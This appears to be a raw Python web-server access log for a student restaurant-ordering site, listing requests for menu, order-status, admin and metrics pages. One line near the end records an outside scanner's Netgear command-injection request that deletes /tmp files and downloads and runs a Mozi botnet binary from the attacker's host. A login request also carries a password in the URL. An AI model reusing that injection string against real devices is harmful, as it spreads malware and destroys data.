Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [25/Nov/2024 11:05:51] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:19] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:22] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:24] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:25] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:26] "GET /order_status.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 11:10:26] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:10:40] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:11:42] "GET /metrics.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 11:11:42] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:42] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:45] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:45] "GET /api/itemMetrics?date=2024-10-29 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:46] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:46] "GET /api/itemMetrics?date=2024-10-29 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:48] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:48] "GET /api/itemMetrics?date=2024-09-30 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:51] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:51] "GET /api/itemMetrics?date=2024-11-25 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:53] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:53] "GET /api/itemMetrics?date=2024-11-24 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:11:57] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:11:57] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:11:57] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:12:28] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:12:28] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:12:28] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:12:29] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:12:30] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:12:30] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:12:30] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:12:30] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:16:10] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:12] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:07] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:09] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:27] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:29] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:33] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:16:52] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:17:00] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:17:05] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:17:06] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:17:06] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:17:07] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:17:07] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:17:08] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:17:08] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:17:10] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:17:10] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:17:19] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:17:27] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:17:27] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:17:46] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:18:03] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:17:58] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:18:03] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:18:03] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:18:08] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:18:08] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:18:08] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:18:08] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:20:07] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:21:26] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:21:26] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:25:43] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:26:06] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:26:08] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:26:56] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:27:10] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:27:38] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:28:55] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:33:15] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:41:21] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:45:41] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:45:41] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:45:57] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:03] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:03] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:03] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:04] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:16] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:16] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:05] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:05] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:06] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:06] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:06] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:06] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:09] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:09] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:10] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:11] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:11] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:16] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:46:16] "GET /api/itemMetrics?date=2024-11-13 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:46:22] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:36] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:46:43] "GET /Dinner.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 11:46:43] "GET /SEPM%20145.jpg HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 11:46:44] "GET /Garlic-Butter-Naan.jpg HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 11:46:50] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:50:24] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:50:43] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:50:43] "GET /api/itemMetrics?date=2024-11-13 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:51:08] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:51:22] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:51:24] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:51:24] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:51:24] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:51:25] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 11:52:09] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:52:09] "GET /api/itemMetrics?date= HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 11:52:18] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 11:52:18] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:00:14] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 12:00:14] "GET /api/itemMetrics?date=2024-11-01 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:03:06] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 12:03:06] "GET /api/itemMetrics?date=2024-11-25 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:03:07] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 12:03:07] "GET /api/itemMetrics?date=2024-11-25 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:03:08] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 12:03:08] "GET /api/itemMetrics?date=2024-11-25 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:03:36] code 404, message File not found
127.0.0.1 - - [25/Nov/2024 12:03:36] "GET /api/itemMetrics?date=2024-11-25 HTTP/1.1" 404 -
127.0.0.1 - - [25/Nov/2024 12:06:30] "GET /metrics.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 12:11:44] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:11:46] "GET /metrics.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 12:13:38] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:14:51] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:14:57] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:15:05] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:15:10] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:15:14] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:28:36] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 12:29:08] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 13:41:25] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 13:42:39] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 13:47:18] "GET /order_status.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Nov/2024 13:48:07] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [25/Nov/2024 13:49:14] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:48:28] "GET /daily_item_quantity.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:48:28] code 404, message File not found
127.0.0.1 - - [03/Dec/2024 09:48:28] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [03/Dec/2024 09:52:33] "GET /daily_wastage_report.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:28] "GET /Lunch.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:28] "GET /order.css HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:28] "GET /SEPM%20146.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:28] "GET /SEPM%20108.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:29] "GET /Mutton%20Biryani.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:29] "GET /panner2.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:29] "GET /Noorth%20Indian%20Thali2.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:30] "GET /cart.js HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /Navbar.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /SEPM%20143.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /SEPM%2022.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /SEPM%20147.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /Jeera%20Rice3.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /Roti1.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /Paneer%20Tikka1.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /Chicken-Biryani3.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /SEPM%20103.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:31] "GET /SEPM%20123.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:45] "GET /Order%20Confirmation.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:53:45] "GET /SEPM%20150.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:54:05] "GET /order_status.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:54:35] "GET /daily_item_quantity.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:55:11] code 404, message File not found
127.0.0.1 - - [03/Dec/2024 09:55:11] "GET /item_metrics.html HTTP/1.1" 404 -
127.0.0.1 - - [03/Dec/2024 09:55:21] code 404, message File not found
127.0.0.1 - - [03/Dec/2024 09:55:21] "GET /daily_item_metrics.html HTTP/1.1" 404 -
127.0.0.1 - - [03/Dec/2024 09:55:27] "GET /metrics.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:55:43] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:55:51] "GET /daily_metrics.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:58:42] "GET /admin.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 09:58:44] "GET /daily_wastage_report.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:58:47] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:58:51] "GET /daily_item_quantity.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:58:54] "GET /metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 09:58:56] "GET /daily_metrics.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 10:06:29] "GET /daily_wastage_report.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 10:06:37] "GET /admin.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 10:06:44] "GET /daily_item_quantity.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:30:33] "GET /admin.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:30:34] "GET /seasonal_data.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:34:22] "GET /seasonal_data.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:18] "GET /admin.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /Lunch.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /order.css HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /SEPM%2022.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /Roti1.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /Navbar.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /SEPM%20147.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:30] "GET /SEPM%20143.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /SEPM%20146.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /SEPM%20108.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /Mutton%20Biryani.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /Noorth%20Indian%20Thali2.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /panner2.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /cart.js HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /Jeera%20Rice3.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /Chicken-Biryani3.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /Paneer%20Tikka1.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /SEPM%20103.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:31] "GET /SEPM%20123.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:36] "GET /Order%20Confirmation.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:36] "GET /SEPM%20150.jpg HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:37] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /First%20Page.html HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /First%20Page.css HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /SEPM%2028.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /SEPM%20127.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /SEPM%20131.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /SEPM%20137.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:44] "GET /SEPM%20148.jpg HTTP/1.1" 200 -
127.0.0.1 - - [03/Dec/2024 11:36:58] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:42:06] "GET /seasonal_data.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:49:00] "GET /seasonal_data.html HTTP/1.1" 304 -
127.0.0.1 - - [03/Dec/2024 11:54:56] "GET /seasonal_data.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:58:56] "GET /login.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:58:58] code 404, message File not found
117.193.230.12 - - [16/Mar/2025 07:58:58] "GET /favicon.ico HTTP/1.1" 404 -
117.193.230.12 - - [16/Mar/2025 07:59:12] "GET /First%20Page.html?email=g%40g&password=g HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /First%20Page.css HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20137.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20108.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20103.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%2028.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20127.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:13] "GET /SEPM%20148.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:14] "GET /Navbar.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:14] "GET /SEPM%20131.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Lunch.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /order.css HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Mutton%20Biryani.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /Noorth%20Indian%20Thali2.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /panner2.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /SEPM%20146.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:16] "GET /cart.js HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%20143.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%20147.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /SEPM%2022.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:17] "GET /Roti1.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:18] "GET /Chicken-Biryani3.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:19] "GET /Jeera%20Rice3.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:20] "GET /Paneer%20Tikka1.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:20] "GET /SEPM%20123.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:23] "GET /Order%20Confirmation.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:23] "GET /SEPM%20150.jpg HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:32] "GET /admin.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:47] "GET //order_status.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 07:59:48] "GET //order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:03:11] "GET //order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:03:12] "GET //order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:04:06] "GET /order_status.html HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 08:04:08] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:06:07] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:06:09] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:06:14] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:08:49] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:16:06] "GET /order_status.html HTTP/1.1" 304 -
115.56.148.57 - - [16/Mar/2025 08:17:36] code 404, message File not found
115.56.148.57 - - [16/Mar/2025 08:17:36] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.56.148.57:60235/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
117.193.230.12 - - [16/Mar/2025 08:20:38] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:21:57] "GET /order_status.html HTTP/1.1" 304 -
185.242.226.10 - - [16/Mar/2025 08:26:10] code 400, message Bad request version ('À\\x14À')
185.242.226.10 - - [16/Mar/2025 08:26:10] "\x16\x03\x01\x00\x8b\x01\x00\x00\x87\x03\x03;\x18Iøh±¯º:?\x034\x85õ\x92¢?>\x88Ç\x9b¨2Ï/\x1fù\x98\x01Rõ\x89\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
165.154.202.146 - - [16/Mar/2025 08:26:30] "GET / HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 08:29:54] "GET /order_status.html HTTP/1.1" 304 -
204.76.203.15 - - [16/Mar/2025 08:33:49] "GET / HTTP/1.1" 200 -
117.193.230.12 - - [16/Mar/2025 08:36:33] "GET /order_status.html HTTP/1.1" 304 -
117.193.230.12 - - [16/Mar/2025 08:37:27] "GET /order_status.html HTTP/1.1" 304 -
127.0.0.1 - - [16/Mar/2025 12:44:51] "GET /login.html HTTP/1.1" 200 -
127.0.0.1 - - [16/Mar/2025 12:44:51] code 404, message File not found
